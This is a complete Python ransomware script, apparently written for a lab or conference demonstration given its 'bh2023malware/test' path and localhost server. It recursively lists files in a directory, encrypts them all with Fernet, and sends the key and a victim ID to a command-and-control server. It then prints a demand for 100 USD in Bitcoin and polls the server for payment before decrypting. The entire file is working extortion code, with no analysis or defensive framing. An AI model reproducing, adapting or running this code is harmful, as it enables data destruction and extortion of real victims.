import requests
import os
import time
import random
import json
import string
from cryptography.fernet import Fernet
global_key = Fernet.generate_key()

def encrypt_file(file_name, key):
    try:
        cipher_suite = Fernet(key)
        with open(file_name, 'rb') as file:
            file_data = file.read()
        encrypted_data = cipher_suite.encrypt(file_data)
        with open(file_name, 'wb') as file:
            file.write(encrypted_data)
    except:
        pass

def encrypt_multiple_files(file_list, key):
    for file_name in file_list:
        time.sleep(0.1)
        encrypt_file(file_name, key)

def decrypt_file(file_name, key):
    cipher_suite = Fernet(key)
    with open(file_name, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = cipher_suite.decrypt(encrypted_data)
    with open(file_name, 'wb') as file:
        file.write(decrypted_data)

def list_all_files(path):
    file_list = []
    for root, dirs, files in os.walk(path):
        for file in files:
            file_list.append(os.path.join(root, file))
    return file_list

files = list_all_files("/home/marco/bh2023malware/test")
try:
    files.remove(__file__)
except:
    pass

def unhit_files(files, key):
    for file in files:
        decrypt_file(file, key)

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for i in range(length))
    return random_string

def exfil(c2, key, files):
    try:
        id = generate_random_string(50)
        header = {"key": key, "ID": id}
        resp = requests.post(c2, headers=header)
        r = json.loads(resp.text)
        addr = r["Addr"]
        print("DO NOT EXIT THIS PROGRAM OR YOU WILL NEVER GET YOUR FILES BACK")
        print("your files have been encrypted send 100 USD in BTC to " + addr + " in order to get your files back")
        run = True
        global global_key
        global_key = 0
        encrypt_multiple_files(files, key)
        key = 0

        while run == True:
            try:
                input('Press "ENTER" When you send the money')
                header = {"key": "Check", "ID": id}
                resp = requests.post(c2, headers=header)
                r = json.loads(resp.text)
                if r["Status"] == "OK":
                    print("decrypting files")
                    unhit_files(files, r["Info"])
                    print("Done! All Files decrypted")
                    run = False
                else:
                    print("No Payment Detected try again in a few minutes")
            except:
                pass
    except KeyboardInterrupt:
        print("DO NOT EXIT THIS PROGRAM OR YOU WILL NEVER GET YOUR FILES BACK")

exfil("http://127.0.0.1:555", global_key, files)
